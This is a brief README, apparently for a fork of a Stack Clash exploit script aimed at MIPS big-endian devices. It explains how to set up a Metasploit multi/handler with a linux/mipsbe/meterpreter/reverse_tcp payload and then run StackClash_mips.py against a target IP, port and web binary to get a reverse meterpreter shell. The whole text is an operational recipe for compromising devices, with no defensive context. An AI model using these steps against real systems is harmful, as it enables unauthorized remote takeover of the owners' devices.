# Stack Clash exploit using reverse meterpreter shell.
It using linux/mipsbe/meterpreter/reverse_tcp payload of metasploit instead of shell code by BigNerd95.

All other things are the same.

# How to get a reverse shell?
1. First, prepare metasploit multi handler on your computer
  > use exploit/multi/handler
  > set payload linux/mipsbe/meterpreter/reverse_tcp
  > set LHOST `YOUR IP`
  > set LPORT  `YOUR LPORT`
  > run
2. After that execute the script
  ./StackClash_mips.py TARGET_IP TARGET_PORT www_binary LHOST LPORT
  Now, you will get a meterpreter shell!
